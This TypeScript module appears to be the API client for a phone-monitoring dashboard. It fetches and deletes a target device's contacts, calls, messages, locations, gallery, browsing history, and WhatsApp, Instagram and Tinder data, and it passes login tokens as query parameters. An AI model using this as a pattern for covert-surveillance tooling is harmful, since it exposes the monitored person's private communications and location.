
import Api from "./Api";


//login functions
export async function FetchUserAccount( login: ILogin):Promise<IUserAccount|null> {

  console.log('====================================');
  console.log("Try login");
  console.log('====================================');
  var Response = await Api.get("/users", {
    params: login,
  });
  console.log(Response.data);
  
  if (Response.status===202){
    var resp:IUserAccount= Response.data;
    return resp;
  }else{
    return null;
  }
}
export async function FetchPlan( plan: any):Promise<IPlan|null> {
  var Response = await Api.get("/plans/"+plan,);
  if (Response.status===202){
    var resp:IPlan= Response.data;
    return resp;
  }else{
    return null;
  }
}

export async function FetchDevices( login: ILogin):Promise<IDevice[]> {
  var Response = await Api.get("/devices", {
    params: login,
  });
  if (Response.status===202){
    var resp:IDevice[]= Response.data;
    return resp;
  }else{
    return [];
  }
}

//fetch function
export async function FetchDevice(id: string, login: ILogin):Promise<IDevice> {
  var DeviceResponse = await Api.get("/device/" + id, {
    params: login,
  });
  console.log(DeviceResponse.data);
  return DeviceResponse.data;
}
export async function FetchContacts(id: string, login: ILogin):Promise<IContact[]> {
  var ContactResponse = await Api.get("/contact/" + id, {
    params: login,
  });
  return ContactResponse.data;
}
export async function FetchCalls(id: string, login: ILogin):Promise<ICall[]> {
  var CallResponse = await Api.get("/call/" + id, { params: login });
  return CallResponse.data;
}
export async function FetchMessages(id: string, login: ILogin):Promise<IMessage[]> {
  var MessageResponse = await Api.get("/message/" + id, {
    params: login,
  });
  return MessageResponse.data;
}
export async function FetchApps(id: string, login: ILogin):Promise<IApp[]> {
  var AppResponse = await Api.get("/app/" + id, { params: login });
 return AppResponse.data;
}
export async function FetchLocations(id: string, login: ILogin):Promise<ILocation[]> {
  var LocationResponse = await Api.get("/location/" + id, {
    params: login,
  });
  return LocationResponse.data;
}
export async function FetchYoutube(id: string, login: ILogin):Promise<IYoutube[]> {
  var YoutubeResponse = await Api.get("/youtube/" + id, {
    params: login,
  });
  return YoutubeResponse.data;
}
export async function FetchHistory(id: string, login: ILogin):Promise<IHistory[]> {
  var HistoryResponse = await Api.get("/history/" + id, {
    params: login,
  });
  return HistoryResponse.data;
}
export async function FetchGallery(id: string, login: ILogin):Promise<IGallery[]> {
  var GalleryResponse = await Api.get("/gallery/" + id, {
    params: login,
  });
  return GalleryResponse.data;
}
export async function FetchWhatsapp(id: string, login: ILogin):Promise<IWhatsapp[]> {
  var WhatsappResponse = await Api.get("/whatsapp/" + id, {
    params: login,
  });
  
  return WhatsappResponse.data;
}
export async function FetchInstagram(id: string, login: ILogin):Promise<IInstagram[]> {
  var InstagramResponse = await Api.get("/instagram/" + id, {
    params: login,
  });
  return InstagramResponse.data;
}
export async function FetchTinder(id: string, login: ILogin):Promise<ITinder[]> {
  var TinderResponse = await Api.get("/tinder/" + id, {
    params: login,
  });
  return TinderResponse.data;
}



//delete functions
export async function DeleteContacts(ids: number[], login: ILogin, id: string) {
  await Api.delete("/contact/" + id, {
    data: {ip:login.ip, token:login.token, user:login.user, ids}
  });
}
export async function DeleteCalls(ids: number[], login: ILogin, id: string) {
  await Api.delete("/call/" + id, {
    data: {ip:login.ip, token:login.token, user:login.user, ids}
  });
}
export async function DeleteMessages(ids: number[], login: ILogin, id: string) {
  await Api.delete("/message/" + id, {
    data: {ip:login.ip, token:login.token, user:login.user, ids}
  });
}
export async function DeleteApps(ids: number[], login: ILogin, id: string) {
  await Api.delete("/app/" + id, {
    data: {ip:login.ip, token:login.token, user:login.user, ids}
  });
}
export async function DeleteLocations(ids: number[], login: ILogin, id: string) {
  await Api.delete("/location/" + id, {
    data: {ip:login.ip, token:login.token, user:login.user, ids}
  });
}
export async function DeleteYoutube(ids: number[], login: ILogin, id: string) {
  await Api.delete("/youtube/" + id, {
    data: {ip:login.ip, token:login.token, user:login.user, ids}
  });
}
export async function DeleteHistory(ids: number[], login: ILogin, id: string) {
  await Api.delete("/history/" + id, {
    data: {ip:login.ip, token:login.token, user:login.user, ids}
  });
}

export async function DeleteWhatsapp(ids: number[], login: ILogin, id: string) {
  await Api.delete("/whatsapp/" + id, {
    data: {ip:login.ip, token:login.token, user:login.user, ids}
  });
}
export async function DeleteInstagram(ids: number[], login: ILogin, id: string) {
  await Api.delete("/instagram/" + id, {
    data: {ip:login.ip, token:login.token, user:login.user, ids}
  });
}
export async function DeleteTinder(ids: number[], login: ILogin, id: string) {
  await Api.delete("/tinder/" + id, {
    data: {ip:login.ip, token:login.token, user:login.user, ids}
  });
}
